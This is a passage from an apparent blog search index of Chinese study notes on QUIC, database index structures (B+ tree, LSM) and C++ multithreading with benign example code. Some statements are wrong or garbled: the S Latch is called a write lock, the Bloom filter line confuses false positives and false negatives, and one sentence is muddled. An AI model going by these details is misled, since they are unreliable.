一个完整的请求和响应的字节流。一个连接上，有多个对象的请求和响应，每个对象的请求和响应在一个流中。 stream id 由 62 位表示，最低两位中一位表示单双向，一位标识流的发起者。 一个连接上，可以有多个流，可以是单向或者双向。 frame : 流中数据的单位，分为数据帧和控制帧。 分组 : 连续传输的数据单位，UDP 数据报载荷中有若干分组，分组包含了若干帧。 快速握手 DH 算法实现 0 RTT 连接迁移实现 基于 UDP，OS 内核不维护和对方通信的状态，IP 地址允许变化 QUIC 连接在用户态，使用 CID (connection) 维护和对方的通信状态 连接双方各自维护着：CID &lt;=&gt; IP 地址 + UDP 端口，两者之间的对应关系 允许 IP 地址变化或者 UDP 端口变化，只要 CID 不变，那么通信关系仍然维持 拥塞控制和流量控制 可插拔的模块化拥塞控制：默认使用 New Reno 和 Cubic 算法 可以采用新的拥塞控制算法：BBR 、BBRv2 这种 流量控制分为：连接级别，流级别 可靠性传输 高效实现可靠性传输 ACK 帧支持最多 256 个 SACK ，而 TCP 最多支持 3 个，可以精确标记接收端哪些分组收到 能避免 99% 以上的超时重传 发送方减少盲目重传 PN 单调递增，解决了序号二义性问题 规定 PN(Packet Number) 单调递增。重传分组具有不同的 PN ，但是分组内可能是之前丢失的帧，具备相同的帧号 RTO 计算无二义性 超时重传 ACK 帧中给出了处理时间，RTO 计算将扣除在接收方的处理时间 头部压缩 QUIC-QPACK 采用动态表、静态表等编码方式，减少头部信息传输的数量 服务器主动推送 当服务器收到资源请求响应时，将客户端可能需要的资源主动推送给客户端 设置 Frame Type 为 PUSH_PROMISE","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Web","slug":"Notes/Web","permalink":"https://racleray.github.io/categories/Notes/Web/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://racleray.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://racleray.github.io/tags/Web/"}],"author":"HeRui"},{"title":"B+、B-link、LSM数据库常用数据结构分析","slug":"B-、B-link、LSM数据库常用数据结构分析","date":"2023-09-12T14:54:34.000Z","updated":"2024-01-09T10:20:30.376Z","comments":true,"path":"posts/a20f1877.html","link":"","permalink":"https://racleray.github.io/posts/a20f1877.html","excerpt":"B+、B-link、LSM 数据结构分析","text":"数据库结构 存储结构 存储文件类型：数据文件 + 索引文件。 文件组织形式 索引组织表 将 数据记录 存储在 索引文件 内部。代表：InnoDB。 堆组织表/哈希组织表 数据记录 存储在 无序堆 中。索引和数据分离。主流一般没用哈希组织表。代表：Oracle、PostgreSQL。 其写入性能比 索引组织表 高，读取性能比 索引组织表 低。但是总体上对性能影响较小。 其中索引文件组织形式，对性能影响更大。一般是B树或者LSM树。存储结构所指的也就是针对索引文件而言。 存储结构分类 In-place update: 直接覆盖旧记录。方便读，但是更新会导致随机IO (IO了多个数据页才找到目标) 到目标位置，性能降低。 随机IO，比如中序遍历 B树 所造成的IO Out-of-place update: 将新内容存到新位置，而不是覆盖，所以查询时需要查找多个位置。但是这很契合固态硬盘（覆盖需要先擦除旧数据）和分布式数据库（本来就是多个位置存储、查询）。同时，为了防止数据无限膨胀，需要进行数据整合（Compaction）。 存储结构的共性 适合磁盘存储，粒度大，一次读取一片连续区域，IO尽量少。 允许并发操作，粒度小，增删改 对存储结构的影响尽量小。 满足1不满足2的结构：大文件、数组，一旦修改，就要锁住整个文件。 满足2不满足1的结构：链表、红黑树、跳表、哈希表。增删改 影响较小，但是读取的粒度也很小。 同时满足两个条件：B树、B+树、LSM树等。 存储引擎并发和事务并发的不同 比如修改一条数据，首先是将对应页的数据加载到内存中，然后在该线程中上Latch锁，防止其他线程修改数据，当数据修改完成后释放Latch。 对于所要修改的那一条数据记录，加上事务锁Lock防止其他并发事务修改，当事务提交后释放Lock，此时Latch已经被释放了。 注意，上图中是B+树，非叶子节点只存储索引，叶子结点存储数据记录。 存储引擎锁机制 MySQL 5.6之前并发控制机制，S Latch 表示写锁，X Latch 表示写锁： MySQL 5.7 8.0 并发控制机制，加入了和 S Latch 兼容的 SX Latch，两者可以同时上锁，也就是说，当对索引树修改时，也可以进行读操作，不阻塞。 多核处理器中Latch代价 多个CPU核，每个都有独立的存储区域。读取和写入过程，需要把页数据加载到这块区域中。假如一个节点页数据（比如B树的根节点）同时存在于多个核的存储区域，此时加Latch锁和解Latch锁的操作必须同步给多个核，就会造成很多性能损耗。 B树 每个数据只存储一份 以页为单位组织，InnoDB中一页16K，一页可以存储几百上千个指针 树高度低，读取数据块较大 增删改 可能造成节点的分裂和合并（SMO，Structure Modification Operation），需要对可能发生分裂或者合并的节点数据进行加锁，导致并发操作性能不理想。 B树优化变种 B+树：优化IO，非叶子节点只存储索引指针，叶子结点存储数据记录，各叶子节点连接成双向循环链表。区分出索引段和数据段，扫描全表时顺序IO得到优化。 这里优化IO，是因为叶子结点不会存储数据，而只是作为搜索索引，遍历索引不会对数据记录进行IO，这降低了索引IO的负担，一次读取更多的索引，IO性能自然更好。 B* 树：优化空间利用率，分裂节点时，当相邻两个空间都满时，分裂出三个节点。 B-Link：优化并发操作，对树的节点上锁时，可以不对整个树上锁，而是从下到上，只锁到需要修改的节点。 Bw: 采用类似LSM树的out-of-place update方法，追加写入方式，完全没有Latch。 LSM树 SSD读性能提升，弥补了LSM读取性能低的劣势。同时LSM树写数据的方式，对SSD的友好，不会频繁擦除数据，增加设备使用寿命。 LSM树是多层结构，下层数据越来越多。写入操作都是写入内存，写满规定容量后，就会将内存数据追加插入磁盘。通过对不同层间数据排序去重，压缩占用空间。 读取数据，以最新的为准。 LSM树存储引擎结（RocksDB)构图。 写入数据先写 write ahead log 内存中数据结构使用 Skip List 数据落盘到 L0 层不进行合并，所以会有重复数据 数据达到需要写入下层的量时，创建 SST(Sorted String Table) 类似一个小型的子数据库结构 每层之间，向下落盘时，只合并重叠的部分，每层数据不重叠 查找时，使用 Bloom Filter (将key值通过多个hash函数，映射到bit array中不同的index位置，查看是否都是1，表示查找命中)，不会返回假阴性（false positive）结果，就是查找结果时不在的，就一定不在 合并策略可以是合并后替换下层数据，也可以是将上层合并的结果放入下一层，而不进行写替换 不实际替换的写效率显然是更高的。这点在设计频繁写入的数据结构时，是可以借鉴这种延迟替换的实现方式的。 对 Compaction 操作，有一些优化方案： 读、合并、写入操作流水线化 Compaction 之后，主动更新 Cache 采用单独设计的FPGA硬件，负责 Compaction 操作，减少CPU负担。 追加写入，没有SMO过程。没有B树存在的Latch导致的问题。 但是，LSM读取数据时，可能会多层多次读取，每层数据较多，缓存Miss情况可能会多一些，读性能收到影响。 另外，虽然写入过程没有SMO，但是Compaction过程是存在SMO问题的，还存在缓冲丢失、write stall（写停顿）等问题。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"DataBase","slug":"Notes/DataBase","permalink":"https://racleray.github.io/categories/Notes/DataBase/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"https://racleray.github.io/tags/Data-Structure/"},{"name":"DataBase","slug":"DataBase","permalink":"https://racleray.github.io/tags/DataBase/"}],"author":"HeRui"},{"title":"C++多线程笔记","slug":"C-多线程笔记","date":"2023-09-12T14:53:11.000Z","updated":"2024-01-09T10:17:59.359Z","comments":true,"path":"posts/24f0dc1c.html","link":"","permalink":"https://racleray.github.io/posts/24f0dc1c.html","excerpt":"现代 C++ 多线程笔记","text":"C++ chrono 明确区分时间点与时间段。 时间点类型：chrono::steady_clock::time_point 等 时间段类型：chrono::milliseconds，chrono::seconds，chrono::minutes ... 利用运算符重载：时间点+时间段=时间点，时间点-时间点=时间段。 1234auto t0 = chrono::steady_clock::now(); // 获取当前时间点auto t1 = t0 + chrono::seconds(30); // 当前时间点的30秒后auto dt = t1 - t0; // 获取两个时间点的差（时间段）int64_t sec = chrono::duration_cast&lt;chrono::seconds&gt;(dt).count(); // 时间差的秒数 跨平台的 sleep：std::this_thread::sleep_for 可以用 std::this_thread::sleep_for 替代 Unix 类操作系统专有的的 usleep。他可以让当前线程休眠一段时间。 12345678#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;int main() &#123; std::this_thread::sleep_for(std::chrono::milliseconds(400)); return 0;&#125; 除了接受一个时间段的 sleep_for，还有接受一个时间点的 sleep_until，表示让当前线程休眠直到某个时间点。 123456789#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;int main() &#123; auto t = std::chrono::steady_clock::now() + std::chrono::milliseconds(400); std::this_thread::sleep_until(t); return 0;&#125; 进程与线程 进程是一个应用程序被操作系统拉起来加载到内存之后从开始执行到执行结束的这样一个过程。简单来说，进程是程序（应用程序，可执行文件）的一次执行。比如双击打开一个桌面应用软件就是开启了一个进程。 线程是进程中的一个实体，是被系统独立分配和调度的基本单位。线程是CPU可执行调度的最小单位。也就是说，进程本身并不能获取CPU时间，只有它的线程才可以。 每个线程共享同样的内存空间，开销比较小。 每个进程拥有独立的内存空间，因此开销更大。 对于高性能并行计算，更好的是多线程。 C++ 中的多线程：std::thread C++11 开始，为多线程提供了语言级别的支持。他用 std::thread 这个类来表示线程。 std::thread 构造函数的参数可以是任意 lambda 表达式。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); interact(); std::cout &lt;&lt; \"Waiting for child thread...\" &lt;&lt; std::endl; t1.join(); std::cout &lt;&lt; \"Child thread exited!\" &lt;&lt; std::endl; return 0;&#125; 如果使用CMake，编译时链接设置： 12find_package(Threads REQUIRED)target_link_libraries(cpptest PUBLIC Threads::Threads) 作为一个 C++ 类，std::thread 同样遵循 RAII 思想和三五法则：因为管理着资源，他自定义了解构函数，删除了拷贝构造/赋值函数，但是提供了移动构造/赋值函数。 当 t1 所在的函数退出时，就会调用 std::thread 的解构函数，这会销毁 t1 线程。 t1.detach() 意味着线程的生命周期不再由当前 std::thread 对象管理，而是在线程退出以后自动销毁自己。 12345678910111213void myfunc() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); t1.detach(); // t1 所代表的线程被分离了，不再随 t1 对象销毁&#125;int main() &#123; myfunc(); interact(); return 0;&#125; 但是 detach 的问题是进程退出时候不会等待所有子线程执行完毕。所以另一种解法是把 t1 对象移动到一个全局变量去，从而延长其生命周期到 myfunc 函数体外。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;#include &lt;vector&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;class ThreadPool &#123; std::vector&lt;std::thread&gt; m_pool;public: void push_back(std::thread thr) &#123; m_pool.push_back(std::move(thr)); &#125; ~ThreadPool() &#123; // main 函数退出后会自动调用 for (auto &amp;t: m_pool) t.join(); // 等待池里的线程全部执行完毕 &#125;&#125;;ThreadPool tpool;void myfunc() &#123; std::thread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); // 移交控制权到全局的 pool 列表，以延长 t1 的生命周期 tpool.push_back(std::move(t1));&#125;int main() &#123; myfunc(); interact(); return 0;&#125; C++20 std::jthread 类 C++20 引入了 std::jthread 类，和 std::thread 不同在于：他的解构函数里会自动调用 join() 函数，从而保证 pool 解构时会自动等待全部线程执行完毕。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;string&gt;#include &lt;vector&gt;void download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;// ~jthread() 解构函数里会自动调用 join()，如果 joinable() 的话std::vector&lt;std::jthread&gt; pool;void myfunc() &#123; std::jthread t1([&amp;] &#123; download(\"hello.zip\"); &#125;); // 移交控制权到全局的 pool 列表，以延长 t1 的生命周期 pool.push_back(std::move(t1));&#125;int main() &#123; myfunc(); interact(); return 0;&#125; 异步 std::async std::async 接受一个带返回值的 lambda，自身返回一个 std::future 对象。lambda 的函数体将在另一个线程里执行。在 main 里面做一些别的事情，最后调用 future 的 get() 方法，如果此时 download 还没完成，会等待 download 完成，并获取 download 的返回值。 除了 get() 会等待线程执行完毕外，wait() 也可以等待他执行完，但是不会返回其值。 只要线程没有执行完，wait() 会无限等下去。而 wait_for() 则可以指定一个最长等待时间，用 chrono 表示单位。他会返回一个 std::future_status 表示等待是否成功。 如果超过这个时间线程还没有执行完毕，则放弃等待，返回 future_status::timeout。 如果线程在指定的时间内执行完毕，则认为等待成功，返回 future_status::ready。 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::future&lt;int&gt; fret = std::async([&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); std::cout &lt;&lt; \"Waiting for download complete...\" &lt;&lt; std::endl; fret.wait(); std::cout &lt;&lt; \"Wait returned!\" &lt;&lt; std::endl; int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; 1234567891011121314151617181920// wait_forint main() &#123; std::future&lt;int&gt; fret = std::async([&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); while (true) &#123; std::cout &lt;&lt; \"Waiting for download complete...\" &lt;&lt; std::endl; auto stat = fret.wait_for(std::chrono::milliseconds(1000)); if (stat == std::future_status::ready) &#123; std::cout &lt;&lt; \"Future is ready!!\" &lt;&lt; std::endl; break; &#125; else &#123; std::cout &lt;&lt; \"Future not ready!!\" &lt;&lt; std::endl; &#125; &#125; int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; std::async 的第一个参数可以设为 std::launch::deferred，这时不会创建一个线程来执行，他只会把 lambda 函数体内的运算推迟到 future 的 get() 被调用时。也就是 main 中的 interact 计算完毕后。 download 的执行仍在主线程中，他只是函数式编程范式意义上的异步，而不涉及到真正的多线程。可以用这个实现惰性求值（lazy evaluation）之类。 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::future&lt;int&gt; fret = std::async(std::launch::deferred, [&amp;] &#123; return download(\"hello.zip\"); &#125;); interact(); int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; return 0;&#125; std::promise 如果不想让 std::async 帮你自动创建线程，想要手动创建线程，可以直接用 std::promise。 然后在线程返回的时候，用 set_value() 设置返回值。在主线程里，用 get_future() 获取其 std::future 对象，进一步 get() 可以等待并获取线程返回值。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;future&gt;int download(std::string file) &#123; for (int i = 0; i &lt; 10; i++) &#123; std::cout &lt;&lt; \"Downloading \" &lt;&lt; file &lt;&lt; \" (\" &lt;&lt; i * 10 &lt;&lt; \"%)...\" &lt;&lt; std::endl; std::this_thread::sleep_for(std::chrono::milliseconds(400)); &#125; std::cout &lt;&lt; \"Download complete: \" &lt;&lt; file &lt;&lt; std::endl; return 404;&#125;void interact() &#123; std::string name; std::cin &gt;&gt; name; std::cout &lt;&lt; \"Hi, \" &lt;&lt; name &lt;&lt; std::endl;&#125;int main() &#123; std::promise&lt;int&gt; pret; std::thread t1([&amp;] &#123; auto ret = download(\"hello.zip\"); pret.set_value(ret); &#125;); std::future&lt;int&gt; fret = pret.get_future(); interact(); int ret = fret.get(); std::cout &lt;&lt; \"Download result: \" &lt;&lt; ret &lt;&lt; std::endl; t1.join(); return 0;&#125; std::future future 为了三五法则，删除了拷贝构造/赋值函数。如果需要浅拷贝，实现共享同一个 future 对象，可以用 std::shared_future。 如果不需要返回值，std::async 里 lambda 的返回类型可以为 void， 这时 future 对象的类型为 std::future。 同理有 std::promise，他的 set_value() 不接受参数，仅仅作为同步用。 互斥量 std::mutex：上锁，防止多个线程同时进入某一代码段。 调用 std::mutex 的 lock() 时，会检测 mutex 是否已经上锁。如果没有锁定，则对 mutex 进行上锁。如果已经锁定，则陷入等待，直到 mutex 被另一个线程解锁后，才再次上锁。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx.lock(); arr.push_back(1); mtx.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx.lock(); arr.push_back(2); mtx.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::lock_guard 根据 RAII 思想，可将锁的持有视为资源，上锁视为锁的获取，解锁视为锁的释放。 std::lock_guard 就是这样一个工具类，他的构造函数里会调用 mtx.lock()，解构函数会调用 mtx.unlock()。 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock_guard grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock_guard grd(mtx); arr.push_back(2); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::unique_lock std::lock_guard 严格在解构时 unlock()，但是有时候我们会希望提前 unlock()。这时可以用 std::unique_lock，他额外存储了一个 flag 表示是否已经被释放。可以直接调用 unique_lock 的 unlock() 函数来提前解锁。他会在解构检测 flag，如果没有释放，则调用 unlock()，否则不调用。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(2); grd.unlock(); printf(\"outside of lock\\n\"); // grd.lock(); // 如果需要，还可以重新上锁 &#125; &#125;); t1.join(); t2.join(); return 0;&#125; std::unique_lock 的构造函数还可以有一个额外参数，那就是 std::defer_lock。指定了这个参数的话，std::unique_lock 不会在构造函数中调用 mtx.lock()，需要之后再手动调用 grd.lock() 才能上锁。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;int main() &#123; std::vector&lt;int&gt; arr; std::mutex mtx; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx); arr.push_back(1); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::unique_lock grd(mtx, std::defer_lock); printf(\"before the lock\\n\"); grd.lock(); arr.push_back(2); grd.unlock(); printf(\"outside of lock\\n\"); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 不同的对象，各有一个 mutex，独立地上锁，可以避免不必要的锁定，提升高并发时的性能。 也可以用无阻塞的 try_lock()，他在上锁失败时不会陷入等待，而是直接返回 false；如果上锁成功，则会返回 true。 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;mutex&gt;std::mutex mtx1;int main() &#123; if (mtx1.try_lock()) printf(\"succeed\\n\"); else printf(\"failed\\n\"); if (mtx1.try_lock()) printf(\"succeed\\n\"); else printf(\"failed\\n\"); mtx1.unlock(); return 0;&#125; std::unique_lock 和 std::mutex 具有同样的接口。 这种只要具有某些指定名字的成员函数，就判断一个类是否满足某些功能的思想，在 Python 称为鸭子类型，而 C++ 称为 concept（概念）。比起虚函数和动态多态的接口抽象，concept 使实现和接口更加解耦合且没有性能损失。 死锁 双方都在等着对方释放锁，但是因为等待而无法释放锁，从而要无限制等下去。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx2.lock(); mtx1.lock(); mtx1.unlock(); mtx2.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 解决1：永远不要同时持有两个锁 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx1.unlock(); mtx2.lock(); mtx2.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx2.lock(); mtx2.unlock(); mtx1.lock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 解决2：保证双方上锁顺序一致 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; mtx1.lock(); mtx2.lock(); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 解决3：用 std::lock 同时对多个上锁 可以用标准库的 std::lock(mtx1, mtx2, ...) 函数，一次性对多个 mutex 上锁。他接受任意多个 mutex 作为参数，并且他保证在无论任意线程中调用的顺序是否相同，都不会产生死锁问题。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock(mtx1, mtx2); mtx1.unlock(); mtx2.unlock(); &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::lock(mtx2, mtx1); mtx2.unlock(); mtx1.unlock(); &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 123456789101112131415161718192021222324252627// RAII#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;thread&gt;#include &lt;mutex&gt;int main() &#123; std::mutex mtx1; std::mutex mtx2; std::thread t1([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::scoped_lock grd(mtx1, mtx2); // do something &#125; &#125;); std::thread t2([&amp;] &#123; for (int i = 0; i &lt; 1000; i++) &#123; std::scoped_lock grd(mtx2, mtx1); // do something &#125; &#125;); t1.join(); t2.join(); return 0;&#125; 同一个线程重复调用 lock() 也会造成死锁。即使只有一个线程一个锁，如果 lock() 以后又调用 lock()，也会造成死锁。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;mutex&gt;std::mutex mtx1;void other() &#123; mtx1.lock(); // do something mtx1.unlock();&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; 解决1：other 里不要再上锁 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;mutex&gt;std::mutex mtx1;/// NOTE: please lock mtx1 before calling other()void other() &#123; // do something&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; 解决2：改用 std::recursive_mutex 他会自动判断是不是同一个线程 lock() 了多次同一个锁，如果是则让计数器加1，之后 unlock() 会让计数器减1，减到0时才真正解锁。但是相比普通的 std::mutex 有一定性能损失。 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;mutex&gt;std::recursive_mutex mtx1;void other() &#123; mtx1.lock(); // do something mtx1.unlock();&#125;void func() &#123; mtx1.lock(); other(); mtx1.unlock();&#125;int main() &#123; func(); return 0;&#125; 线程安全的vector封装 vector 不是多线程安全的容器。多个线程同时访问同一个 vector 会出现数据竞争（data-race）现象。 先看看错误的方式：用一个类封装一下对 vector 的访问，使其访问都受到一个 mutex 的保护。会出错了！因为 size() 是 const 函数，而 mutex::lock() 却不是 const 的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; std::mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; # Error： mutex::lock() 却不是 const 的 size_t size() const &#123; m_mtx.lock(); size_t ret = m_arr.size(); m_mtx.unlock(); return ret; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.size() &lt;&lt; std::endl; return 0;&#125; 解决方法：mutable，让 this 为 const 时仅仅给 m_mtx 开后门，可以用 mutable 关键字修饰他，从而所有成员里只有他不是 const 的。 123456789101112131415161718class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; size_t size() const &#123; m_mtx.lock(); size_t ret = m_arr.size(); m_mtx.unlock(); return ret; &#125;&#125;; 读写锁 读可以共享，写必须独占，且写和读不能共存。 标准库提供了 std::shared_mutex。上锁时，要指定你的需求是读还是写，负责调度的读写锁会帮你判断要不要等待。 push_back() 需要修改数据，因需求此为拉，使用 lock() 和 unlock() 的组合。 size() 则只要读取数据，不修改数据，因此可以和别人共享一起喝，使用 lock_shared() 和 unlock_shared() 的组合。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;vector&gt;#include &lt;shared_mutex&gt;class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::shared_mutex m_mtx;public: void push_back(int val) &#123; m_mtx.lock(); m_arr.push_back(val); m_mtx.unlock(); &#125; size_t size() const &#123; m_mtx.lock_shared(); size_t ret = m_arr.size(); m_mtx.unlock_shared(); return ret; &#125;&#125;;int main() &#123; MTVector arr; std::thread t1([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(i); &#125; &#125;); std::thread t2([&amp;] () &#123; for (int i = 0; i &lt; 1000; i++) &#123; arr.push_back(1000 + i); &#125; &#125;); t1.join(); t2.join(); std::cout &lt;&lt; arr.size() &lt;&lt; std::endl; return 0;&#125; 或者： 123456789101112131415class MTVector &#123; std::vector&lt;int&gt; m_arr; mutable std::shared_mutex m_mtx;public: void push_back(int val) &#123; std::unique_lock grd(m_mtx); 